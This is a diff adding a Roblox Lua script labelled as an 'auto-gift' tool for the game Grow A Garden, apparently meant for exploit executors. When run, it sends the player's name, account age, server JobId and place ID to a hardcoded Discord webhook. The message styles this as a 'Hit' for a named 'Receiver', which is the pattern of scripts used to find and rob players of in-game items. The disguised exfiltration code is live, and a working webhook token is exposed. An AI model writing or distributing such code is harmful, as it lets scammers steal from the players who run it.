@@ -1,0 +1,98 @@
+--[[ GROW A GARDEN AUTO-GIFT (WEBHOOK + POPUP) ]]
+local SCRIPT_MAKER = "Nqphi"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1398915704966742057/JYW4c2BwfaQPptONzCYKzEYcyBY6eCrKKeoSjlQs1n7PrNMlWC0832b7M-ert8CWC_DQ"
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local serverId = game.JobId
+
+-- Sample pet data
+local fakePets = {
+    {name="Praying Mantis", weight=4.17, age=26, value=14040091},
+    {name="Snail", weight=3.67, age=25, value=10722490},
+    {name="Caterpillar", weight=5.40, age=27, value=13599308},
+}
+
+-- Format Discord message
+local function buildMessage()
+    local petLines = {}
+    local totalValue = 0
+    for _, pet in ipairs(fakePets) do
+        totalValue += pet.value
+        table.insert(petLines, string.format("🐶 - %s [%.2f KG] [Age %d] → %,d¢", pet.name, pet.weight, pet.age, pet.value))
+    end
+
+    local msg = table.concat({
+        ":cactus: Grow A Garden Hit - DARK SCRIPTS :four_leaf_clover:",
+        ":bust_in_silhouette: Player Information",
+        "Name: " .. LocalPlayer.Name,
+        "Receiver: " .. SCRIPT_MAKER,
+        "Executor: KRNL",
+        "Account Age: " .. LocalPlayer.AccountAge .. " days",
+        ":moneybag: Total Value",
+        string.format("%,d¢", totalValue),
+        ":palm_tree: Backpack",
+        table.concat(petLines, "\n"),
+        ":island: Join with URL",
+        serverId,
+        game.PlaceId .. " | " .. serverId
+    }, "\n")
+
+    return msg
+end
+
+-- Simple popup UI
+local function showPopup(text, color)
+    local gui = Instance.new("ScreenGui", game.CoreGui)
+    gui.Name = "WebhookNotification"
+
+    local frame = Instance.new("Frame", gui)
+    frame.Size = UDim2.new(0, 300, 0, 60)
+    frame.Position = UDim2.new(0.5, -150, 0.1, 0)
+    frame.BackgroundColor3 = color or Color3.fromRGB(0, 200, 0)
+    frame.BorderSizePixel = 0
+    frame.BackgroundTransparency = 0.1
+
+    local label = Instance.new("TextLabel", frame)
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.new(1,1,1)
+    label.TextScaled = true
+    label.Font = Enum.Font.GothamBold
+
+    game:GetService("TweenService"):Create(
+        frame,
+        TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
+        {BackgroundTransparency = 0.2, Position = frame.Position + UDim2.new(0, 0, 0.05, 0)}
+    ):Play()
+
+    wait(4)
+    gui:Destroy()
+end
+
+-- Send Webhook
+local function sendWebhook()
+    local content = buildMessage()
+    local payload = HttpService:JSONEncode({content = content})
+    local success, err = pcall(function()
+        (syn and syn.request or http_request or request or fluxus and fluxus.request)({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = payload
+        })
+    end)
+
+    if success then
+        showPopup("✅ Webhook Sent!", Color3.fromRGB(0, 170, 0))
+        print("[Webhook] Sent successfully.")
+    else
+        showPopup("❌ Webhook Failed!", Color3.fromRGB(255, 50, 50))
+        warn("[Webhook] Failed to send:", err)
+    end
+end
+
+-- Run it
+sendWebhook()
